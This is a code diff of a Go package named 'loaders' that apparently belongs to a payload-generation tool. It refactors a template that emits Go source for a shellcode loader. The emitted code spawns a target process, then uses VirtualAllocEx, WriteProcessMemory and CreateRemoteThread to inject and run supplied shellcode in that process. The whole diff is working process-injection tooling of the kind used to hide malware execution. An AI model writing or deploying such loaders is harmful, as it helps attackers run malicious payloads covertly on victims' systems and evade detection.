@@ -2,18 +2,22 @@ package loaders
 
 import (
 	"fmt"
+	"strings"
 )
 
-func GetCRTTemplate(targetProcess string) string {
-	return fmt.Sprintf(`
-package main
+type CRTTemplate struct{}
 
+func (t CRTTemplate) Import() string {
+	return fmt.Sprintf(`
 import (
     "syscall"
     "unsafe"
 )
+`)
+}
 
-
+func (t CRTTemplate) Const() string {
+	return fmt.Sprintf(`
 const (
     MEM_COMMIT                = 0x1000
     MEM_RESERVE               = 0x2000
@@ -32,8 +36,11 @@ var (
     WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
     CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
 )
+`)
+}
 
-
+func (t CRTTemplate) Init() string {
+	return fmt.Sprintf(`
 func loadProcess(target string) *syscall.ProcessInformation {
     var si syscall.StartupInfo
 	var pi syscall.ProcessInformation
@@ -60,11 +67,13 @@ func loadProcess(target string) *syscall.ProcessInformation {
 
 	return &pi
 }
+`)
+}
 
-func ExecuteOrderSixtySix(shellcode []byte) {
-
+func (t CRTTemplate) Process() string {
+	return fmt.Sprintf(`
     /* spawn target process */
-    process := loadProcess("%s")
+    process := loadProcess("__PROCESS__")
     oldProtectCfg := PAGE_READWRITE
 
      /* allocating the appropriate amount of memory */
@@ -96,6 +105,29 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 
     /* load remote thread */
     _, _, _ = CreateRemoteThread.Call(uintptr(process.Process), 0, 0, baseAddr, 0, 0, 0)
+`)
 }
-    `, targetProcess)
+
+func (t CRTTemplate) GetTemplate(targetProcess string) string {
+	var template = `
+package main
+
+__IMPORT__STATEMENT__
+
+__CONST__STATEMENT__
+
+__IMPORT__INIT__	
+
+func ExecuteOrderSixtySix(shellcode []byte) {
+
+__IMPORT__PROCESS__
+
+}
+`
+	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
+	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
+	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
+	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)
+
+	return strings.Replace(template, "__PROCESS__", targetProcess, -1)
 }
